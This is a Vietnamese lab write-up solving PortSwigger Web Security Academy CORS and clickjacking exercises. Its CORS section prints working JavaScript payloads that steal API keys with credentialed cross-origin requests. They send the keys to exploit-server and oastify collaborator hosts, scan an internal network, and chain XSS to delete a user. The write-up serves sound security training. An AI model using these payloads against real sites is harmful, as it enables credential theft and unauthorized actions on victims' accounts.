# CORS - CLICKJACKING - NGUYỄN VĂN THỌ

<hr>

## Cross-origin resource sharing

### Bài 1: CORS vulnerability with basic origin reflection

>![](https://i.imgur.com/C4MAZqS.png)

Website này chứa lỗ hổng cấu hình CORS khiến nó tin tưởng mọi origins. Để khai thác, sử dụng Javascript để lấy API key của admin.

Kiểm tra các truy vấn, ta thấy truy vấn đến đường dẫn `/accountDetails` sẽ trả về apikey trong một object JSON.

>![](https://i.imgur.com/65pa3Ia.png)


Cũng trong request này, chú ý phần response ta thấy giá trị của `Access-Control-Allow-Credentials` bằng `true` tức là web có sử dụng CORS, cho phép cookie được include trong các request cross-site.


Thử thêm trường `Origin` với giá trị bất kì vào trong request đó, ta thấy giá trị của nó phản hồi trong `Access-Control-Allow-Origin` header, tức là nó cho phép các request từ bất kì các nguồn nào có mặt trong `Origin` header.

Sử dụng payload sau để Fetch nội dung của đường dẫn `/accountDetails` và gửi vào server của ta .

```javascript!
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a0b0080043a43ecc1ecf86800e00076.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='/log?key='+this.responseText;
};

</script>
```

Thu được kết quả trong phản hồi.

>![](https://i.imgur.com/bw8ktC1.png)

Submit API vừa thu được.

>![](https://i.imgur.com/23xxoF3.png)

<hr>


### Bài 2: CORS vulnerability with trusted null origin

>![](https://i.imgur.com/nlUAwyk.png)

CORS của trang web chấp nhận giá trị `null` trong whitelist, tìm cách khai thác gửi request cross-site tới và lấy API key.

Để trình duyệt set giá trị null cho `Origin` thì các request phải thuộc một trong các tình huống sau:
>![](https://i.imgur.com/bXhpgGm.png)


Kiểm tra trang web, ta thấy nó giống với bài trên, API key được server trả về thông qua request đến đường dẫn `/accountDetails`

Tuy nhiên giờ server đã tạo 1 whitelist các origin được truy cập, trong đó có giá trị `null`. Để trình duyệt set Origin = null thì ta dựa vào các tình huống liệt kê trên, trong đó có thể sử dụng thuộc tính sandbox của thẻ iframe để làm việc này.

```javascript!
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a15003403a957f0c14f210b006c0009.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a85005a03db5768c1d7206b01ab00d0.exploit-server.net//log?key='+this.responseText;
    };
</script>">
</iframe>
```

Kết quả bypass được CORS whitelist và lấy được thông tin.
>![](https://i.imgur.com/IY8lGaJ.png)

<hr>

### Bài 3: CORS vulnerability with trusted insecure protocols

>![](https://i.imgur.com/8KXlBSO.png)

CORS của trang web này thiếu an toàn ở chỗ nó tin tưởng tất cả subdomains và cả protocols. Khai thác và lấy API key của admin.

Tìm kiếm các subdomain bị lộ ra trong trang web, em phát hiện chức năng check stock gửi request đến đường dẫn `http://stock.0a8500bc04d92d95c074953600080091.web-security-academy.net/?productId=1&storeId=1`

Trang web này được trust bởi trang web đang tấn công

>![](https://i.imgur.com/Gjj3edE.png)


Kiểm tra thử miền này, ta thấy nó có lỗ hổng reflected XSS khi ta inject một ID không hợp lệ. Thử bằng payload `<script> alert(1)</script>`

Vì miền này được trust, nên tại đây ta có thể gửi cross-origin request tới trang web đang tấn công thông qua lỗ hổng XSS và thu về API key, sau đó gửi sang exploit server

Payload:

```javascript!
<script>
document.location = "http://stock.0a8500bc04d92d95c074953600080091.web-security-academy.net/?productId=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onload%20%3D%20reqListener%3B%0Areq.open%28%27get%27%2C%27https%3A%2F%2F0a8500bc04d92d95c074953600080091.web-security-academy.net%2FaccountDetails%27%2Ctrue%29%3B%0Areq.withCredentials%20%3D%20true%3B%0Areq.send%28%29%3B%0A%0Afunction%20reqListener%28%29%20%7B%0A%20%20%20location%3D%27https%3A%2F%2Fexploit-0a09000304f12d5dc018944701b7004e.exploit-server.net%2Fexploit%2Flog%3Fkey%3D%27%2Bthis.responseText%3B%0A%7D%3B%0A%3C%2Fscript%3E&storeId=1"
</script>
```
Kết quả:

>![](https://i.imgur.com/XyiHoo2.png)

<hr>

### Bài 4: CORS vulnerability with internal network pivot attack

>![](https://i.imgur.com/CTHfjQp.png)

Website của bài lab chứa lỗ hổng trong việc cấu hình CORS khi mà nó tin cậy requests từ domain nội bộ. Để solve bài lab, xóa user `carlos`.

Đầu tiên, theo gợi ý của đề, có một máy nội bộ thuộc địa chỉ mạng `192.168.0.0/24` port 8080. Để tìm ra địa chỉ này, ta phải brute-force bằng cách gửi tới nạn nhân 1 trang web fetch nội dung địa chỉ từ 192.168.0.1 đến 192.168.0.254.

```javascript!
<script>
var q = [], collaboratorURL = 'http://na1zwg2o5br0hf6mhwx6cdrg076zuo.oastify.com';


//Brute-force full địa chỉ mạng nội bộ, mỗi request cách nhau 1mili giây để tránh flooding mạng nội bộ.ạng.
for(i=1;i<=254;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>
```

Ta thu được mã nguồn của trang web nội bộ đó, giao diện như sau:
>![](https://i.imgur.com/Qgyebvo.png)

>![](https://i.imgur.com/mkkAMrB.png)

Thử đăng nhập với tài khoản và mật khẩu là `<script>alert(1)</script>`, ta thấy nó trả về:
```javascript!
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
        url = url +  '/login?time='+Date.now()+'&username='+encodeURIComponent('<script>alert(1)</script>')+'&password=test
	fetch(url).then(r => r.text().then(text => {
		location = collaboratorURL+ '?code='+encodeURIComponent(text)+'&'+Date.now();
	}))
}

fetchUrl("http://192.168.0.218:8080", "http://w308ppvxykk9aozva5qf5mkptgzlna.oastify.com");
</script>
```
>![](https://i.imgur.com/dIvaZgd.png)

>![](https://i.imgur.com/9ZV34fG.png)


Vậy là trang web này có chứa lỗi XSS, ta có thể khai thác để gửi cross-origin request tới trang web chính.

Đầu tiên cần kiểm tra xem trang `/admin` có nội dung gì.


```javascript!


<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}

fetchUrl("http://192.168.0.218:8080", "http://nlcz7gdogb20sfhmsw86nd2gb7hy8mx.oastify.com");
</script>
```
>![](https://i.imgur.com/i1mEA32.png)

>![](https://i.imgur.com/cob7Lxk.png)

Chỉ cần nhập username vào ô input và submit button `Delete user` là xóa được user và solve bài lab

```javascript!
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}
```
>![](https://i.imgur.com/Y7N4P0S.png)


<hr>


## CLICKJACKING

### Bài 1: Basic clickjacking with CSRF token protection

>![](https://i.imgur.com/DHIOrsj.png)

Đề yêu cầu ta nhúng 1 trang web với `z-index=2`, và đè lên frame đó bằng 1 thẻ `div` có `z-index=1` để dụ nạn nhân click lên nút `delete user`

Ta tạo html như yêu cầu của đề, bỏ nó trong exploit server và send to victim.
>![](https://i.imgur.com/KAjdefN.png)

>![](https://i.imgur.com/jxw0H7x.png)

<hr>


### Bài 2: Clickjacking with form input data prefilled from a URL parameter

>![](https://i.imgur.com/wo5gEHl.png)

Mục tiêu của bài lab là thay đổi email của nạn nhân bằng việc sử dụng URL param. 

Kiểm tra ta thấy trang web nhận tham số từ URL và nhúng nó vào form input.

>![](https://i.imgur.com/OZQTevH.png)

Vì vậy, ta có thể triển khai một cuộc tấn công Clickjacking với frame được nhúng bằng đường dẫn `/my-account?email=abc@gmail.com`, và dụ victim click update email (chức năng này không đòi hỏi nhập mật khẩu hay gì cả).

>![](https://i.imgur.com/L8C5YY1.png)

Kết quả:

>![](https://i.imgur.com/pvF2vUt.png)



<hr>

### Bài 3: Clickjacking with a frame buster script

>![](https://i.imgur.com/EtMfevi.png)

Trang web này sử dụng 1 cơ chế ngăn chặn website khỏi việc bị nhúng. Tìm cách bypass và thay đổi email của nạn nhân.

Đăng nhập và kiểm tra trang `my-account`, ta thấy nó nhận tham số từ URL để nhúng vào thẻ input.

>![](https://i.imgur.com/tLD43kL.png)

Vì trang web có cơ chế không cho phép iframed, nên ta sẽ thêm thuộc tính `sandbox`, thuộc tính sẽ giúp loại bỏ iframe khỏi 1 số hạn chế.

Để cho phép submit form, ta cần chỉnh giá trị của sandbox là `allow-forms`

Viết 1 script html như bài trên để nhúng trang web vào thẻ iframe, tuy nhiên, đường dẫn kèm theo tham số email để nó chèn vào input.

>![](https://i.imgur.com/D9xIw2i.png)

Khi nạn nhân click sẽ bị thay đổi email

>![](https://i.imgur.com/lix3fFz.png)

<hr>

### Bài 4: Exploiting clickjacking vulnerability to trigger DOM-based XSS

>![](https://i.imgur.com/ZmN4O98.png)

Bài lab này chứa lỗ hổng XSS được trigger bởi click, thực hiện clickjacking để khai thác XSS và gọi hàm print().

Kiểm tra ta thấy sao khi submit feed back, nó trả về tên ta trong phản hồi như sau:

>![](https://i.imgur.com/xslFHhO.png)

Kiểm tra ta thấy đoạn code chỗ đó là như này:

>![](https://i.imgur.com/IyuDDgT.png)

Thử để payload name =  `<img src=x onerror=alert(1)>` thì  kích hoạt được XSS.

>![](https://i.imgur.com/RNegMTb.png)

Vậy ý tưởng ở đây là nhận giá trị tham số name từ param URL và kích hoạt xss thông qua thao tác submit. => ta sẽ nhúng đường dẫn có chứa param vào thẻ iframe để thực hiện clickjacking

Viết ý tưởng trên thành script html để clickjacking, như sau:

>![](https://i.imgur.com/897Erge.png)

Kết quả:

>![](https://i.imgur.com/BggNZDg.png)

<hr>

### Bài 5: Multistep clickjacking

>![](https://i.imgur.com/8nDbIaF.png)

Bài lab có bảo vệ các chức năng liên quan tới account bằng CSRF token và có cả dialog để bảo vệ khỏi clickjacking.Tìm cách dụ user click vào button xóa account và xác nhận.

Kiểm tra quy trình xóa account ta thấy rằng để đến được `/my-account/delete` thì đầu tiền phải click button delete. Vì vậy ta cần dụ dỗ nạn nhân click 2 lần. Việc của ta chỉ là tạo ra 2 vị trí click giả nằm đúng với vị trí của button confirm hiện ra.

>![](https://i.imgur.com/5fXhesC.png)

Kết quả:

>![](https://i.imgur.com/7jKxduX.png)

<hr>
